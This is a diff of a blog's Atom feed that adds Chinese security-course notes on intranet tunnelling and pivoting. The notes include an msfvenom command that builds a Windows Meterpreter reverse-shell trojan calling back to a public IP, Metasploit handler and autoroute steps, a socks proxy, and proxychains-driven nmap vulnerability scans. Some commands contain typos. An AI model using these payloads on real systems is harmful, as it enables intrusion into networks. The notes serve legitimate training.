@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.fangmingxuan.com/"/>
-  <updated>2020-05-15T02:54:54.347Z</updated>
+  <updated>2020-05-17T07:51:42.716Z</updated>
   <id>http://www.fangmingxuan.com/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>T3sec 学习笔记—–第九讲-内网转发穿透</title>
+    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B9%9D%E8%AE%B2-%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%A9%BF%E9%80%8F/"/>
+    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B9%9D%E8%AE%B2-%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%A9%BF%E9%80%8F/</id>
+    <published>2020-05-17T07:03:47.966Z</published>
+    <updated>2020-05-17T07:51:42.716Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第九讲-内网转发穿透"><a href="#T3SEC-—–第九讲-内网转发穿透" class="headerlink" title="T3SEC —–第九讲:内网转发穿透"></a>T3SEC —–第九讲:内网转发穿透</h1>    <div id="aplayer-HxtOpfwR" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>内网穿透和代理转发</p><h1 id="一-内网穿透"><a href="#一-内网穿透" class="headerlink" title="一.内网穿透"></a>一.内网穿透</h1><p>花生壳  frp  等……</p><h2 id="内网穿透–获取内网服务器的session"><a href="#内网穿透–获取内网服务器的session" class="headerlink" title="内网穿透–获取内网服务器的session"></a>内网穿透–获取内网服务器的session</h2><ul><li>配置frp穿透   <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></li><li>22==&gt;6000    4444==&gt;6002</li><li>使用木马反弹session</li><li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=123.57.147.141LPORT=6002 -f exe &gt;test.exe</li><li>选择模块 use exploit/multi/handler 设置set payload windows/meterpreter/reverse_tcp<ul><li>set lhost 192.168.1.1</li><li>set lport 4444</li></ul></li></ul><h1 id="二-内网代理转发"><a href="#二-内网代理转发" class="headerlink" title="二.内网代理转发"></a>二.内网代理转发</h1><h2 id="在msf下可使用"><a href="#在msf下可使用" class="headerlink" title="在msf下可使用"></a>在msf下可使用</h2><ul><li>run post/windows/gather/arp_scanner rhost=192.168.1.0/24   //扫描内网中的192.168.1.0 网段</li><li>run post/multi/manage/autoroute  //自动添加路由</li><li>run sutoroute -s 192.168.2.1/24  //添加192.168.2.1/24 的路由</li><li>run autoroute -p //查看路由条目</li></ul><h2 id="socks-代理"><a href="#socks-代理" class="headerlink" title="socks 代理"></a>socks 代理</h2><ul><li>use auxiliary/server/socks4a //设置socks代理服务器</li></ul><h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><ul><li>proxychains遵循GUN协议的一款适用于Linux系统的网络代理设置工具.强制由任一程序发起的TCP连接请求必须通过注入TOP或SOCKS4,SOCKS5 或HTTP(S)代理.支持的认证方式包括:SOCKS4/5的用户/密码认证,HTTP的基本认证.允许TCP和DNS通过代理隧道,并且可配置多个代理.</li></ul><h3 id="proxychains配置"><a href="#proxychains配置" class="headerlink" title="proxychains配置"></a>proxychains配置</h3><ul><li>vi /etc/proxychains.cof</li><li>proxychains 使用</li><li>proxychains nmap -sT -sV –script=vuln 192.168.1.100</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
+      
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
+    
+      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
+    
+  </entry>
   
   <entry>
     <title>T3sec 学习笔记—–第八讲-nc后门</title>
